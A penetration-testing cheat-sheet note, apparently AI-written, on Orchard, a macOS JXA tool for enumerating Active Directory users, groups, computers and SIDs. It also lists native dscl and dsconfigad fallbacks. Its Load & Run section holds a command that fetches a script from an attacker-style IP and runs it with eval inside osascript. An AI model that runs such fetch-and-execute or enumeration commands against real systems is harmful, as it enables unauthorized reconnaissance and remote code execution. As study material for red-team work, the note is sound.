# Orchard

**Tags:** `#orchard` `#macos` `#jxa` `#activedirectory` `#enumeration` `#openDirectory` `#lolbin`

macOS **Active Directory enumeration** via **JXA** (JavaScript for Automation, its-a-feature)
— queries the domain through the OpenDirectory APIs using the JXA→ObjC bridge, so it runs
inside the signed `osascript` LOLBin with no Windows tooling. The macOS counterpart to
[[Tools/AD/PowerView|PowerView]] (Windows) / [[Tools/AD/windapsearch|windapsearch]] (Linux):
enumerate domain users, groups, computers, SIDs, and forest/domain info from an AD-bound Mac.

**Source:** https://github.com/its-a-feature/Orchard
**Runs via:** `osascript -l JavaScript` — see [[Tools/Scripting/osascript (AppleScript-JXA)|osascript]].

---

## Load & Run

```bash
# Interactive JXA session — load Orchard.js (from a local copy or a URL)
osascript -l JavaScript -i
>> eval(ObjC.unwrap($.NSString.alloc.initWithDataEncoding(
     $.NSData.dataWithContentsOfURL($.NSURL.URLWithString('http://10.10.14.5:8001/Orchard.js')),
     $.NSUTF8StringEncoding)));
>> Get_CurrentDomain();

# One-shot
osascript -l JavaScript -e "eval(...load Orchard.js...); Get_DomainUser({name:'julio'});"
```

## Functions (v1.3)

| Area | Functions |
|---|---|
| Domain info | `Get_CurrentDomain()`, `Get_CurrentNETBIOSDomain()`, `Get_DomainSID()`, `Get_Forest()` |
| Users | `Get_DomainUser()`, `Get_LocalUser()` |
| Groups | `Get_DomainGroup()`, `Get_DomainGroupMember()`, `Get_LocalGroup()`, `Get_LocalGroupMember()` |
| Computers | `Get_DomainComputer()` |
| SIDs | `ConvertTo_SID()`, `ConvertFrom_SID()` |
| Generic | `Get_OD_ObjectClass()` (query any OpenDirectory object class) |

Functions take **named parameters** with defaults (e.g. `Get_DomainUser({name:'...'})`).

---

## Built-in Fallbacks (no tool needed)

An AD-bound Mac exposes the domain through native CLIs — useful when you can't drop Orchard:

```bash
dsconfigad -show                                   # is this Mac bound? to which domain/forest?
dscl "/Active Directory/DOMAIN/All Domains" -read /Users/julio     # read a domain user
dscl "/Active Directory/DOMAIN/All Domains" -list /Users
id julio@domain.com                                # resolves via AD if bound
```

> [!note] **See also** — Windows equiv [[Tools/AD/PowerView|PowerView]]; Linux equiv [[Tools/AD/windapsearch|windapsearch]] / [[Tools/AD/ldapdomaindump|ldapdomaindump]]; the JXA runner [[Tools/Scripting/osascript (AppleScript-JXA)|osascript]]; macOS Kerberos companion [[Tools/AD/Bifrost|Bifrost]]; graph the results in [[Tools/AD/BloodHound|BloodHound]].

---

*Created: 2026-09-28*
*Updated: 2026-09-28*
*Model: claude-opus-4-8*
